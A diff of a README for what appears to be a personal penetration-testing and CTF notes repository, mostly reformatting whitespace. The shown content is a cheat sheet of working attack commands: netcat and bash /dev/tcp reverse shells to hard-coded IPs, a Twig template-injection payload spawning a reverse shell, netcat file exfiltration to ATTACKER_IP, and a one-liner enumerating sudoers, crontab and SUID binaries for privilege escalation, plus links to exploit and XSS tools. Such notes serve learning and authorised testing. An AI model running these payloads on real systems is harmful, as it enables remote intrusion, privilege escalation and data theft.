@@ -5,13 +5,19 @@ This repository contains my personal notes and tricks that I've gathered while w
 Please note that these notes are a work in progress, and I'll be continuously adding more content as I progress through the challenges and machines.
 
 ## Introduction
+
 In this repository, you will find a compilation of various tricks, commands, and techniques that can be useful during penetration testing activities. These notes are intended to assist in the process of hacking and securing systems.
 
 ### [notes](./other/notes.md)
+
 ### [web](./other/web.md)
+
 ### [osint](./other/osint.md)
+
 ---
+
 #### Reverse shells
+
 ```nc
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.18.22.27 4444 >/tmp/f
 ```
@@ -33,28 +39,36 @@ bash -i >& /dev/tcp/10.18.22.27/4444 0>&1
 {{ this.controller.getTwig().getFilter("bash -c 'bash -i >& /dev/tcp/10.127.255.241/4455 0>&1'") }}
 ```
 
-
 ---
+
 #### File Transfer on `Netcat`
 
 1. To download a file on the remote shell:
+
 ```nc
 nc ATTACKER_IP ATTACKER_PORT < [file_to_download]
 ```
+
 2. To receive the file on the attacker machine:
+
 ```nc
 nc -l ATTACKER_PORT > [output_file_path]
 ```
+
 #### Transfer files using `scp`:
+
 ```
 scp backup.zip toor@192.168.122.30:/home/username_of_remote_host
 ```
 
 ---
+
 ### Linux Privilege Escalation:
 
 [other](./other/src/linux_priv_esc.md)
+
 #### information gathering
+
 ```bash
 cat /proc/version
 cat /etc/issue
@@ -79,7 +93,9 @@ cat /etc/exports #file sharing
 nmap --script=vuln <ip>
 cat /proc/1/cgroup #if u in docker
 ```
+
 quik one-line bash script with colorful output to enumerate linux machine
+
 ```bash
 for cmd in "history" "id" "echo $PATH" "cat /etc/crontab" "sudo -V " "cat /proc/version" "cat /etc/issue" "cat /etc/sudoers" "cat /etc/sudoers.d" "env" "ip route" "uname -a" "netstat -tupln | grep LISTEN" "find / -type f -perm /4000 2>/dev/null" "getcap -r / 2>/dev/null" "cat /etc/exports" "cat /proc/1/cgroup"; do echo  "\n\033[1;34mCommand: $cmd\033[0m"; echo "\033[1;32m$(eval $cmd)\033[0m"; echo  "\033[1;33m\n===================================================================================================\n==================================================================================================="; done
 ```
@@ -105,6 +121,7 @@ for cmd in "history" "id" "echo $PATH" "cat /etc/crontab" "sudo -V " "cat /proc/
 ---
 
 ### links
+
 * [database with CVE exploits](https://cvexploits.io/)
 * [explainshell.com](https://explainshell.com/)
 * [reverse shells](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
@@ -120,7 +137,8 @@ for cmd in "history" "id" "echo $PATH" "cat /etc/crontab" "sudo -V " "cat /proc/
 * [pentest-checklist](https://github.com/Hari-prasaanth/Web-App-Pentest-Checklist)
 * [awesome ctf](https://github.com/apsdehal/awesome-ctf)
 
-####  Encoding techniques:
+#### Encoding techniques:
+
 - [splitbrain](https://www.splitbrain.org/_static/ook/)
 - [hashes](https://hashes.com/en/tools/hash_identifier)
 - [md5hashing](https://md5hashing.net/hash)
@@ -134,6 +152,7 @@ for cmd in "history" "id" "echo $PATH" "cat /etc/crontab" "sudo -V " "cat /proc/
 - [xxs-encoder](http://evuln.com/tools/xss-encoder/)
 
 #### Tools
+
 * [reconftw](https://github.com/six2dez/reconftw)
 * [google dorks](/HackNotes/other/src/dorks.md)
 * [aquatone](https://github.com/michenriksen/aquatone/releases/tag/v1.7.0)(screenshots)
@@ -144,7 +163,8 @@ for cmd in "history" "id" "echo $PATH" "cat /etc/crontab" "sudo -V " "cat /proc/
 * [cdncheck](https://github.com/projectdiscovery/cdncheck)(identifying the technology associated with dns)
 * [XXSHunter](https://xsshunter.trufflesecurity.com/app/#/)
 
- [other links](/HackNotes/other/src/links.md)
+[other links](/HackNotes/other/src/links.md)
 
 ---
+
 Happy hacking!
